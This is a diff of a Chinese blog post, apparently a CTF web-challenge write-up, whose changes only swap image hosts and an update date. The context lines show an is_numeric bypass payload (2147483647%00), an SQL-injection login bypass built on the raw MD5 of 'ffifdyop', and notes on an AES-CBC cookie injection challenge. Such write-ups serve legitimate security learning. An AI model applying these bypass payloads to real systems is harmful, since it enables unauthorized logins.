 <p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p>
 <p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p>
-<p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="http://oy0tigw51.bkt.clouddn.com/201803202002_274.png" alt=""></p>
+<p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803202002_274.png" alt=""></p>
 <h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p>
 <p>在查看页面源码中发现 代码泄露</p>
 <pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];
@@ -1259,10 +1261,10 @@ echo $info;
 <p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p>
 <pre><code>SELECT * FROM admin WHERE
 username = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011637_720.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011637_720.png" alt=""></p>
 <h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p>
 <p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011334_838.png" alt=""><br>查看源码得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011334_838.png" alt=""><br>查看源码得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p>
 <p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies
  </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure
  </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p>
@@ -1393,7 +1395,7 @@ if __name__ == &#39;__main__&#39;:
     <p><span>文章字数:</span><span class="post-count">6,763</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-02, 16:10:18</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:17</p>
     <span>原始链接:</span><a class="post-url" href="/archives/79216fa/" title="实验吧web—writeup">http://mang0.me/archives/79216fa/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
